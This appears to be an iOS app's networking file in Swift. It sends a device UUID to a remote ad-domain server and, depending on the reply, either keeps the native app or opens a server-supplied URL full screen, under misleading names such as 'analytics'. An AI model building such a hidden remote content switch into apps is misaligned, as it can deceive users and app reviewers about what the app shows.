//
//  File.swift
//  
//
//  Created by mac on 04.04.2023.
//

import Foundation
import Firebase
import FirebaseMessaging
import FirebaseFirestore

fileprivate struct URLBuilder {
    
    func url(withUUID uuid: String, appID: String) -> URL? {
        var urlComponents = URLComponents()
        urlComponents.scheme = "https"
        urlComponents.host = "apps.vortexads.io"
        urlComponents.path = "/v2/guest"
        urlComponents.queryItems = [
            URLQueryItem(name: "uuid", value: uuid),
            URLQueryItem(name: "app", value: appID)
        ]
        
        return urlComponents.url
    }

}

class Networking: NSObject, MessagingDelegate, UNUserNotificationCenterDelegate {
    
    private var uuid: String {
        if let uuid = UserDefaults.standard.string(forKey: "uuid") {
            return uuid
        } else {
            let uuid = UUID().uuidString
            UserDefaults.standard.set(uuid, forKey: "uuid")
            return uuid
        }
    }
    
    
    private struct JSONResponse: Codable {
        var url: String
        var strategy: String
    }
    
    enum Result {
        case analytics(opening: Opening?)
        case error
        case native
    }
    
    
    
    func request(appID: String, _ completion: @escaping (_ result: Networking.Result) -> Void) {
        fetchToken { _ in /* TAM SETUP MESSAGING, NOTIFICATIONS ETC.!  */ }
        
        guard let url = URLBuilder().url(withUUID: uuid, appID: appID) else {
            completion(.error)
            return
        }
        
        request(url: url, completion)
    }
    
    
    
    private func request(url: URL, _ completion: @escaping (_ result: Networking.Result) -> Void) {
        URLSession.shared.dataTask(with: url) { (data, response, error) in
            
            guard let statusCode = (response as? HTTPURLResponse)?.statusCode else {
                completion(.error)
                return
            }
            
            DispatchQueue.main.async {
                
                switch statusCode {
                case 200:
                    guard let data = data,
                          let jsonResponse = try? JSONDecoder().decode(Networking.JSONResponse.self, from: data)  else {
                        completion(.error)
                        return
                    }

                    self.result(from: jsonResponse, completion)
                    
                case 204:
                    completion(.native)
                    
                default:
                    completion(.error)
                }
                
            }
            
        }.resume()
    }
    
    
    
    // MARK: - Temporary deprecated!
    private func fetchToken(_ completion: @escaping (String) -> Void) {
        FirebaseApp.configure()
        Messaging.messaging().delegate = self

        let center = UNUserNotificationCenter.current()
        center.requestAuthorization(options: [.alert, .badge, .sound]) { (success, error) in
            DispatchQueue.main.async {
                Messaging.messaging().token { (result, error) in
                    // tut proizoshel pizdec :)
                }
            }
        }
    }
    
    
    
    private func result(from jsonResponse: JSONResponse,
                        _ resultHandler: @escaping (Networking.Result) -> Void) {
        
        switch jsonResponse.strategy {
        case "PreviewURL":
            
            if let url = URL(string: jsonResponse.url) {
                self.checkFirestore { fullScreen in
                    let opening = Opening(url: url, fullScreen: fullScreen)
                    resultHandler(.analytics(opening: opening))
                }
            } else {
                resultHandler(.analytics(opening: nil))
            }
            
        case "PreviousURL":
            
            resultHandler(.analytics(opening: .previous))
            
        default:
            resultHandler(.error)
        }
    }
    
    private func checkFirestore(_ completion: @escaping (_ fullScreen: Bool) -> Void) {
        let database = Firestore.firestore()
        let docRef = database.document("app/app")

        docRef.getDocument { snapshot, error in
            guard let data = snapshot?.data(), error == nil else {
                completion(true)
                return
            }

            let fullScreen = (data["fs"] as? Bool) ?? true
            completion(fullScreen)
        }
    }
    
        
}
